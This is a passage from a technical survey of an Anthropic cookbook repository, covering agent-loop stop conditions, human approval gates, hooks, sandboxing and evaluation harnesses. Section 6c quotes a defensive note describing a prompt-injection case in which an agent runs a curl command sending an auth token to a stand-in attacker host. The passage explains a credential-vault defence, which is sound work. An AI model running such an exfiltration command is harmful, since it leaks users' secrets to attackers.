                         "content": [b.model_dump(exclude_none=True) for b in response.content]})
        messages[:] = truncate_to_last_compaction(messages)

        if response.stop_reason == "end_turn":
            final_text = "".join(b.text for b in response.content if getattr(b, "type", "") == "text")
            return {"text": final_text, "result": extract_result_tag(final_text),
                    "turns": turn + 1, "tool_calls": tool_calls, ...}
        if response.stop_reason not in ("pause_turn", "max_tokens"):
            raise RuntimeError(f"unexpected stop_reason={response.stop_reason}")

    raise RuntimeError(f"did not finish within {max_turns} turns")
```
The *answer-shaped* definition of done is enforced by `extract_result_tag` + a compaction instruction that survives summarization: `"Your summary MUST also include this instruction verbatim: 'Provide your final answer wrapped in <result> and </result> tags.'"` The stated failure mode: *"Without them, the post-compaction agent has a summary of what it found but not what it was asked, and on long questions it frequently asks the user to restate the question, which scores zero."*

### 4c. Evaluator-optimizer acceptance condition — unbounded `while True`

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/patterns/agents/evaluator_optimizer.ipynb` — done is a **literal string match on `PASS`**, and there is **no iteration cap** (the one loop in the repo that can spin forever):

```python
def loop(task: str, evaluator_prompt: str, generator_prompt: str) -> tuple[str, list[dict]]:
    """Keep generating and evaluating until requirements are met."""
    memory = []
    chain_of_thought = []
    thoughts, result = generate(generator_prompt, task)
    memory.append(result)
    chain_of_thought.append({"thoughts": thoughts, "result": result})

    while True:
        evaluation, feedback = evaluate(evaluator_prompt, result, task)
        if evaluation == "PASS":
            return result, chain_of_thought
        context = "\n".join(["Previous attempts:", *[f"- {m}" for m in memory],
                             f"\nFeedback: {feedback}"])
        thoughts, result = generate(generator_prompt, task, context)
        memory.append(result)
        chain_of_thought.append({"thoughts": thoughts, "result": result})
```
The evaluator prompt defines the bar: `Only output "PASS" if all criteria are met and you have no further suggestions for improvements.` … `<evaluation>PASS, NEEDS_IMPROVEMENT, or FAIL</evaluation>`.

### 4d. Server-side outcome grading — a capped, externally-adjudicated done

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_verify_with_outcome_grader.ipynb`:

```python
client.beta.sessions.events.send(session.id, betas=BETAS, events=[
    {"type": "user.define_outcome", "description": TASK,
     "rubric": {"type": "text", "content": RUBRIC}, "max_iterations": 5},
])
...
TERMINAL = {"satisfied", "max_iterations_reached", "failed", "interrupted"}
...
        elif ev.type == "span.outcome_evaluation_end":
            res = ev.result
            render_feedback(ev.explanation)
            iters += 1
            if res in TERMINAL:
                break
```
Documented semantics: `**max_iterations defaults to 3 (max 20).**` and the anti-thrash rule *"If every run hits the cap with the grader finding the same kind of issue each time, the writer can't act on the feedback and you're paying for iterations that don't converge."* Also: *"if they contradict each other … the loop returns `failed` instead of thrashing."* Observed run: 3 grading passes, 5/7 → 6/7 → 7/7.

### 4e. Managed Agents — `session.status_idle` is *not* terminal by itself

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/utilities.py:47-73` (the shared exit condition every CMA notebook imports):

```python
def stream_until_end_turn(client: Anthropic, session_id: str) -> None:
    """The session emits `session.status_idle` any time it's waiting for input, both at
    end of turn and when a custom tool call needs a response, so we disambiguate with
    `stop_reason.type` and only exit on `end_turn`."""
    with client.beta.sessions.events.stream(session_id) as stream:
        for ev in stream:
            match ev.type:
                case "agent.message": ...
                case "agent.tool_use": print(f"\n[{ev.name}]")
                case "session.status_idle" if ev.stop_reason and ev.stop_reason.type == "end_turn":
                    break
                case "session.status_terminated":
                    return
    wait_for_idle_status(client, session_id)
```
`wait_for_idle_status` (lines 29-44) absorbs a documented race: *"an `archive()` call issued immediately after the stream exits to 400 with 'cannot be archived while its status is running.'"* Poll deadline `max_wait=5.0`, `time.sleep(0.25)`.

The same idle-disambiguation appears in `/Users/.../managed_agents/sentry/cma.py:45-64` and in TypeScript at `/Users/.../managed_agents/cma-mcp/src/cma.ts:113` (`e.stop_reason?.type === "requires_action" ? "requires_action" : "idle"`), and as a settle-timer in `/Users/.../managed_agents/self_hosted_sandboxes/cf-worker/src/runner.ts:13` and `/Users/.../managed_agents/self_hosted_sandboxes/modal/sandbox_runner.py:14`.

### 4f. "No tool calls left" as the terminator

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/memory_demo/demo_helpers.py:131-178`:

```python
    max_turns: int = 5,           # docstring: "Maximum number of turns to prevent infinite loops"
    ...
    turn = 1
    while turn <= max_turns:
        response, assistant_content, tool_results = run_conversation_turn(...)
        messages.append({"role": "assistant", "content": assistant_content})
        if tool_results:
            messages.append({"role": "user", "content": tool_results})
            turn += 1
        else:
            # No more tool uses, conversation complete
            break
    return response
```

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_evaluation/tool_evaluation.ipynb` uses the terse `while response.stop_reason == "tool_use":` form with **no** iteration cap.

### 4g. SDK-level caps

- `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/08_Dynamic_workflows.ipynb`: `ClaudeAgentOptions(..., allowed_tools=["Read","Write","Edit","Glob","Grep","Workflow"], permission_mode="acceptEdits", max_turns=40)`.
- `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/05_Building_a_session_browser.ipynb`: `max_turns=1` (single-shot summarizer).
- `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/multimodal/crop_tool.ipynb`: uses the SDK `tool_runner` with `max_iterations=20`, described as *"stops when the model answers (or after `max_iterations`, a guard against runaway loops)."*
- `output_config={"effort": "max", "task_budget": {"type": "tokens", "total": 3_000_000}}` in the agentic-search notebook — *"Tells Claude its cumulative output budget across all turns and compactions, so it can pace itself instead of giving up early."*

---

## 5. Human-in-the-loop

### 5a. Approval as a *custom tool* round-trip (Managed Agents)

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/sre_incident_responder.ipynb` defines three custom tools the *application* executes, not the sandbox:

```python
{"type": "custom", "name": "open_pull_request",
 "description": "Open a pull request against the infra repo with the proposed fix.",
 "input_schema": {"type": "object",
   "properties": {"title": {"type":"string"}, "body": {"type":"string"},
                  "diff": {"type":"string","description":"Unified diff of the change."}},
   "required": ["title","body","diff"]}},
{"type": "custom", "name": "request_approval",
 "description": "Ask the on-call human to approve the proposed PR before merging.",
 "input_schema": {"type":"object","properties":{"summary":{"type":"string"}},"required":["summary"]}},
{"type": "custom", "name": "merge_pull_request",
 "description": "Merge an approved pull request.",
 "input_schema": {"type":"object","properties":{"pr_number":{"type":"integer"}},"required":["pr_number"]}},
```
The blocked state is explicit in the notebook prose: *"when the agent calls one of your custom tools, the session goes `idle` with `stop_reason.type == "requires_action"` and waits for your application to respond with a `user.custom_tool_result`. … The loop below … **returns** when `request_approval` arrives, because that one needs a human. In production, 'needs a human' usually means *post it to Slack*: drop the agent's summary into the on-call channel with an **Approve** button."*

### 5b. `decide` / `escalate` and the pending-window bug

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_gate_human_in_the_loop.ipynb` — the calibration framing is stated up front: *"an agent that escalates everything is exhausting to work with, and an agent that escalates nothing is dangerous."* The driving loop:

```python
    for ev in stream:
        if ev.type == "agent.custom_tool_use":
            tool_use_events[ev.id] = ev
        elif ev.type == "session.status_idle" and ev.stop_reason:
            if ev.stop_reason.type == "requires_action":
                for event_id in ev.stop_reason.event_ids:
                    if event_id in responded_to:
                        continue
                    ...
                    elif name == "escalate":
                        human = simulate_human_review(receipt_id, args["question"])
                        decisions[receipt_id] = {"lane": "escalated", "human_decision": human, **args}
                        result = {"human_decision": human}
                    client.beta.sessions.events.send(session_id=session.id, events=[
                        {"type": "user.custom_tool_result", "custom_tool_use_id": event_id,
                         "content": [{"type": "text", "text": json.dumps(result)}]}])
                    responded_to.add(event_id)
            elif ev.stop_reason.type == "end_turn":
                break
```
With the documented sharp edge: *"when an agent emits more than 5 parallel custom tool calls, the server returns `stop_reason.event_ids` as a sliding window of the next 5 pending … we need to dedupe across status_idle events to avoid double-responding to the same custom tool call (which 400s)."*

### 5c. Production HITL without a held connection

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/CMA_operate_in_production.ipynb`: register a Console webhook on `session.status_idled` — *"which is the signal that the agent is either done OR waiting on a tool result … The session simply sits idle until you respond, with no long-lived connection on your side."* Handler verifies HMAC:

```python
    expected = hmac.new(WEBHOOK_SECRET.encode(), body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, sig)
...
@app.post("/webhooks/anthropic")
async def receive(req: Request, x_anthropic_signature: str = Header()):
    ...
    if event["event_type"] == "session.status_idled": ...
    elif event["event_type"] == "session.budget_reached": ...
```
`session.budget_reached` is described as *"the signal a supervisor process needs to decide, per session, whether to raise the cap or leave the work paused."*

### 5d. Agent SDK permission surfaces

- `permission_mode="plan"` — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/01_The_chief_of_staff_agent.ipynb`: *"Plan mode instructs the agent to create a detailed execution plan without performing any actions. The agent analyzes requirements, proposes solutions, and outlines steps, but doesn't modify files, execute commands, or make changes."* With a documented caveat: *"the agent will try calling its `ExitPlanMode()` tool, which is only relevant in the interactive mode. In this case, you can send up a follow-up query with `continue_conversation=True` for the agent to execute its plan in context."*
- Allow-rule vs. approval distinction — `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/04_migrating_from_openai_agents_sdk.ipynb:172`: *"`allowed_tools` is an allow-rule — it makes the tool available to the agent. Whether the agent can call it without user approval depends on `permission_mode`. Read-only custom tools like `check_policy` run freely by default; tools that write files or run shell commands will prompt unless you set `permission_mode="acceptEdits"` or `"bypassPermissions"`."*
- **Not present in this repo**: `can_use_tool`, `PermissionResultDeny`, `PermissionResultAllow`. Grepped across all `.py`/`.ts`/`.md`/`.json`/`.ipynb` — zero hits. Denial is expressed here through `disallowed_tools`, `permission_mode`, and non-zero-exit `PreToolUse` hooks.

---

## 6. Failure modes / guardrails

### 6a. `PreToolUse` hooks as hard blocks (SRE range check)

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/site_reliability_agent/infra_setup.py:1013-1027`:

```
# Shell scripts that validate agent write operations before they execute.
# The Claude Agent SDK runs these as PreToolUse hooks — if a hook exits
# with a non-zero status, the tool call is blocked.
#
#   validate_pool_size.sh:
#     Ensures DB_POOL_SIZE changes stay within 5–100 (safe operating range).
#     Triggered before edit_config_file calls.
#
#   validate_config_before_deploy.sh:
#     Checks that config values are sane before allowing a deploy command.
#     Triggered before run_shell_command calls that redeploy the api-server.
```
Generated `hooks/validate_pool_size.sh` parses the hook's stdin JSON (`data['input']['new_value']`) and:
```bash
    if [ "$NEW_VALUE" -lt 5 ] 2>/dev/null || [ "$NEW_VALUE" -gt 100 ] 2>/dev/null; then
        echo "BLOCKED: DB_POOL_SIZE=$NEW_VALUE is outside safe range (5-100)"
        exit 1
    fi
```
`hooks/validate_config_before_deploy.sh` re-reads `config/api-server.env` at deploy time and emits `BLOCKED: Cannot deploy with DB_POOL_SIZE=$POOL_SIZE (safe range: 5-100)` — i.e. a second, independent check at the deploy boundary rather than trusting the edit-time check.

By contrast the cookbook's own `PreToolUse` hooks are **warn-only** (`/Users/.../skills/.claude/hooks/pre-bash.sh`, `pre-write.sh`): they `echo` a warning and `exit 0`, with inline comments `# Allow but warn` / `# Allow but warn - don't block`.

### 6b. Sandbox / tool-scoping guardrails

- Escape-hatch removal: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/observability_agent/agent.py:109-111` — `# Configure disallowed tools to ensure MCP usage / # Without this, the agent could bypass MCP by using Bash with gh CLI`.
- Read-only pipeline: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/06_The_vulnerability_detection_agent.ipynb` — *"With `Bash`/`Write`/`Edit` withheld the agent stays read-only. … A production version would add `"Bash"` to `allowed_tools` so the agent can compile with `-fsanitize=address` and confirm each crash; that belongs inside a locked-down container."*
- Path-traversal guard: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_use/memory_tool.py:37-73` — `_validate_path` rejects anything not starting with `/memories`, then re-checks `full_path.relative_to(self.memory_root.resolve())`, raising `Path '{path}' would escape /memories directory. Directory traversal attempts are not allowed.` Tested at `/Users/.../tool_use/tests/test_memory_tool.py`.
- Session-id injection guard + timing-safe auth: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/claude_agent_sdk/hosting/server.py` — `if not SESSION_ID_RE.fullmatch(session_id): raise HTTPException(400)` (*"this validation is a security control, not cosmetics"*), `secrets.compare_digest` on the bearer token (*"so the check isn't a timing oracle"*), `MAX_BODY_BYTES = 256 * 1024`.
- Network egress: `/Users/.../claude_agent_sdk/hosting/kubernetes/` ships an nginx egress-proxy + `manifests/network-policy.yaml`; CMA environments use `config={"type": "cloud", "networking": {"type": "limited"}}` in the SRE and gate notebooks.

### 6c. Prompt-injection / credential-exfiltration guardrail

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/sentry/skill.md` documents the vault placeholder model with an explicit injection scenario:

```
1. **The container never holds the real token.** It holds an opaque placeholder.
   `echo $SENTRY_AUTH_TOKEN` prints the placeholder, and so does anything that tries
   to exfiltrate the environment variable.
2. **Substitution is host-scoped.** The egress proxy swaps the placeholder for the token
   only on outbound requests to the credential's `allowed_hosts`. A prompt injection that
   runs `curl https://evil.example.com -d "$SENTRY_AUTH_TOKEN"` sends the placeholder.

What this doesn't give you: the agent can still *use* the credential for anything the
allowlisted host permits. ... The vault limits *where* the token can go, and Sentry scopes
limit *what* it can do once there.
```

### 6d. Hallucination / stale-context guards

- **Stale docs fixture**: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/managed_agents/utilities.py:82-106` builds a repo where `ARCHITECTURE.md` deliberately lies, "to show how an agent that trusts documentation without verifying it against the actual code will produce confidently wrong answers." The embedded doc says `[Out of date. The real structure is microservices under services/. An agent that trusts this without reading the code will answer wrong.]`
- **Independent grader with a fresh context**: `CMA_verify_with_outcome_grader.ipynb` — *"a writer that knows the criteria is still grading its own work. It will say it passed whenever it believes it did, and it will not go back and refetch a URL it already cited … The grader has no choice but to do those checks. It opens with a fresh context window and nothing but the rubric and the artifact."* Rubric anti-shortcut clause: `Do NOT corroborate via mirrors, reposts, or search snippets; the cited URL itself must fetch.`
- **Adversarial skeptic stage**: `/Users/.../claude_agent_sdk/08_Dynamic_workflows.ipynb` — *"'Double-check your findings' is also just an instruction, and under context pressure it gets skipped. The workflow below makes verification structural"* → EXTRACT → VERIFY (one agent per claim, clean context) → SKEPTIC (*"one skeptic agent re-reads the cited source and tries to refute the confirmation"*) → REPORT. The planted answer key includes a quote-drift trap: `"one of the fastest-growing online cycling retailers"` vs. the draft's `"the fastest-growing"`.
- **Context rot**: `/Users/.../tool_use/context_engineering/context_engineering_tools.ipynb` — *"as the number of tokens in the context window increases, the model's ability to accurately recall information from that context decreases."* Three mitigations compared head-to-head: `clear_tool_uses_20250919`, `compact_20260112`, `memory_20250818`.

### 6e. Retries, error handling, budgets

- Tool-execution errors are fed back to the model rather than raised — `/Users/.../tool_evaluation/tool_evaluation.ipynb`:
  ```python
        except Exception as e:
            tool_response = f"Error executing tool {tool_name}: {str(e)}\n"
            tool_response += traceback.format_exc()
  ```
- Context-window overflow is caught, not crashed — `/Users/.../tool_use/context_engineering/context_engineering_tools.ipynb`:
  ```python
        except anthropic.BadRequestError as e:
            hit_limit = True
            print(f"│  ⚠ CONTEXT WINDOW LIMIT REACHED at turn {turn} (API rejected)")
            break
  ```
- Retry policy — `/Users/.../evals/agentic_search/reproduce_agentic_search_benchmarks.ipynb`: *"The SDK retries automatically on connection errors, 408, 409, 429, and ≥500 responses with exponential backoff, and honors the `Retry-After` header … The default is 2 retries; for a full benchmark run we set `max_retries=20`."* Plus a **silent-failure warning**: *"server-tool rate limits are separate from model token limits. Exhausting them does not raise an API error; the `too_many_requests` shows up as a tool-result error inside the response … client retries won't help because the API call returned 200."* And: *"wrap each per-question `sample()` call in a `try/except` so a single `stop_reason="refusal"` or unrecoverable error scores that question as zero instead of aborting the whole run."*
- **Spend cap** — `/Users/.../managed_agents/CMA_cap_session_spend.ipynb`: `budget={"type":"limit","max_list_cost":{"currency":"USD","amount":"10"}}` on `sessions.create`; `assert stop_reason == "budget_reached"`. Semantics: *"`budget_reached` is a pause, not a failure. The session sits in `idle` … The cap is enforced between model requests, so the recorded `list_cost` can land slightly past `max_list_cost`: the request that crosses the line finishes, then the session pauses."* And *"A budget can only be attached at creation: a session created without one can never gain one later."*
- Failure-injection fixture for CI-style iteration: `/Users/.../managed_agents/example_data/iterate/` (three planted bugs in `calc.py` with `test_calc.py`) driven by `/Users/.../managed_agents/CMA_iterate_fix_failing_tests.ipynb`.

### 6f. What `tool_evaluation/` actually measures

Two files: `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_evaluation/tool_evaluation.ipynb` and `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/tool_evaluation/evaluation.xml`.

**Dataset**: `evaluation.xml` holds **8** `<task>` elements, each `<prompt>` + a single ground-truth `<response>` string (compound interest → `11614.72`; projectile distance → `87.25`; sphere surface area → `304.65`; population stdev → `7.61`; pH → `4.46`; mortgage payment → `1013.37`; photon energy → `3.61e-19`; quadratic root → `2`).

**Harness**: `parse_evaluation_file()` (ElementTree) → for each task `agent_loop(prompt, tools)` → regex-extract the *last* `<response>`, `<summary>`, `<feedback>` blocks.

**Metrics** produced per task by `evaluate_single_task()`:
```python
    return {"prompt": ..., "expected": task["response"], "actual": response,
            "score": int(response == task["response"]),      # exact string match, 0/1
            "total_duration": duration_seconds,
            "tool_calls": tool_metrics,                       # {name: {count, durations[]}}
            "num_tool_calls": sum(len(m["durations"]) for m in tool_metrics.values()),
            "summary": summary, "feedback": feedback}
```
Aggregated into `REPORT_HEADER` as `Accuracy: {correct}/{total} ({accuracy:.1f}%)`, `Average Task Duration`, `Average Tool Calls per Task`, `Total Tool Calls`.

**What it is really testing**: the *tool definition*, not the model. The shipped calculator tool is deliberately under-documented —
```python
calculator_tool = {
    "name": "calculator",
    "description": "",  # An unhelpful tool description.
    "input_schema": {"type": "object",
        "properties": {"expression": {"type": "string",
            "description": "",  # An unhelpful schema description.
        }}, "required": ["expression"]},
}
```
— and the system prompt forces the model to critique it: *"Comment on tool names: Are they clear and descriptive? … Comment on any errors encountered during tool usage: Did the tool fail to execute? Did the tool return too many tokens? Identify specific areas for improvement and explain WHY they would help."* So the deliverable is an accuracy/latency/call-count scorecard **plus** natural-language tool-design feedback. Caveats visible in the code: single-tool-block-per-turn (`next(block for block in response.content if block.type == "tool_use")` ignores parallel calls), `eval()`-based dispatch flagged `# noqa: S307` with an inline "use a safer dispatch mechanism like a dictionary of functions" warning, and **no** turn cap on `while response.stop_reason == "tool_use":`.

---

## 7. Repo conventions

### 7a. `registry.yaml` — the notebook index

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/registry.yaml`: 926 lines, **92 entries**, YAML list, first line `# yaml-language-server: $schema=./.github/registry_schema.json`. A real entry:

```yaml
- title: Build an SRE incident response agent with Claude Managed Agents
  description: 'Wire Claude into your on-call flow: when an alert fires, the agent
    reads logs and runbooks, pinpoints the root cause, opens a fix PR, and waits
    for your approval before merging.'
  path: managed_agents/sre_incident_responder.ipynb
  authors:
  - gaganb-ant
  date: '2026-04-10'
  categories:
  - Claude Managed Agents
  - Observability
```

Only six keys are actually used across all 92 entries: `title`, `description`, `path`, `authors`, `date`, `categories`. `/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/.github/registry_schema.json` additionally permits `slug` (`^[a-z0-9-]+$`), `github_url`, `tags`, `difficulty` (`beginner|intermediate|advanced|""`), `use_case`, `thumbnail`, `archived`; `required: ["title","path","categories","authors","date"]`, `additionalProperties: false`, `categories.minItems: 1`, `date` pattern `^\d{4}-\d{2}-\d{2}$`.

Categories are a **closed enum** of 14 values. Observed distribution: Tools 24, Agent Patterns 22, RAG & Retrieval 19, Claude Managed Agents 16, Integrations 16, Responses 13, Claude Agent SDK 9, Multimodal 8, Evals 7, Skills 5, Observability 4, Cybersecurity 2, Thinking 2, Fine-Tuning 1.

**Drift found**: 96 notebooks on disk, 92 registered, 0 registry paths missing from disk. The 4 unregistered notebooks are `managed_agents/CMA_explore_unfamiliar_codebase.ipynb`, `managed_agents/CMA_gate_human_in_the_loop.ipynb`, `managed_agents/CMA_orchestrate_issue_to_pr.ipynb`, `tool_use/tool_search_alternate_approaches.ipynb`. `archived: true` appears on zero entries.

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/authors.yaml` maps GitHub username → `{name, website?, avatar?}`, validated by `.github/authors_schema.json` (`name` required, `additionalProperties: false`) and kept sorted by `scripts/validate_authors_sorted.py --fix`.

### 7b. `CLAUDE.md`

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/CLAUDE.md` (111 lines) is the machine-readable contributor contract: Quick Start (`uv sync --all-extras`, `uv run pre-commit install`), Development Commands (`make format|lint|check|fix|test`), Code Style (100 cols, double quotes, ruff; notebooks relaxed for `E402, F811, N803, N806`), Git Workflow (`<username>/<feature-description>`, conventional commits), 5 Key Rules, the slash-command list, a Project Structure block, and:

```
## Adding a New Cookbook

1. Create notebook in the appropriate directory
2. Add entry to `registry.yaml` with title, description, path, authors, categories
3. Add author info to `authors.yaml` if new contributor
4. Run quality checks and submit PR
```

Its model-pinning rule is the most operationally specific part and is **already stale relative to the code**: it names `claude-sonnet-5`, `claude-haiku-4-5`, `claude-opus-4-8`, while shipped notebooks/agents variously use `claude-sonnet-4-6`, `claude-opus-4-6`, `claude-opus-4-7`, `claude-opus-4-8`, `claude-opus-5`, `claude-sonnet-5`. The CLAUDE.md Project Structure block also omits `managed_agents/`, `claude_agent_sdk/`, `patterns/`, `observability/`, `coding/`, `tool_evaluation/`.

There are five further scoped `CLAUDE.md` files: `skills/CLAUDE.md`, `claude_agent_sdk/chief_of_staff_agent/CLAUDE.md` (an agent *memory* file — company facts, comp bands, board composition, risk factors, script usage), `managed_agents/{cma-mcp,linear,slack,sentry,roadtrip_planner}/CLAUDE.md`.

### 7c. `CONTRIBUTING.md` and CI

`/Users/samuelchien/dev/software-devops/research/repos/automation/anthropics__anthropic-cookbook/CONTRIBUTING.md` (224 lines): validation stack = nbconvert + ruff + "Claude AI Review"; `**Note**: Notebook outputs are intentionally kept in this repository as they demonstrate expected results for users.`; three slash commands that *"use the exact same validation logic as our CI pipeline"*; `External contributors will have limited API testing to conserve resources.`; security section (`Report security issues privately to security@anthropic.com`).

Pre-commit (`/Users/.../.pre-commit-config.yaml`): SHA-pinned `astral-sh/ruff-pre-commit` (`ruff-check --fix` and `ruff-format`, `types_or: [python, pyi, jupyter]`), plus two local hooks — `validate-notebooks` (`uv run python scripts/validate_notebooks.py`) and `validate-authors-sorted`.

GitHub Actions (`/Users/.../.github/workflows/`, 9 files): `claude-link-review.yml`, `claude-model-check.yml`, `claude-pr-review.yml`, `links.yml`, `lint-format.yml`, `notebook-diff-comment.yml`, `notebook-quality.yml`, `notebook-tests.yml`, `verify-authors.yml`. `/Users/.../.github/scripts/verify_registry.py` enforces registry consistency.

The repo's own agent config lives in `/Users/.../.claude/`: one subagent (`agents/code-reviewer.md`, frontmatter `tools: Read, Grep, Glob, Bash, Bash(git status:*)`, ~200 lines of checklist ending in a four-bucket feedback format `Critical Issues / Important Issues / Suggestions / Positive Notes`), seven slash commands (`add-registry`, `link-review`, `model-check`, `notebook-review`, `review-issue`, `review-pr`, `review-pr-ci`) each with `allowed-tools:` frontmatter scoping them to e.g. `Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*)`, and the `cookbook-audit` skill (`SKILL.md` + `style_guide.md` + `validate_notebook.py`) which scores notebooks **X/20 across 4 dimensions** (Narrative Quality, Code Quality, Technical Accuracy, Actionability & Understanding) and runs `detect-secrets` against `scripts/detect-secrets/.secrets.baseline` with custom plugins at `scripts/detect-secrets/plugins.py`.
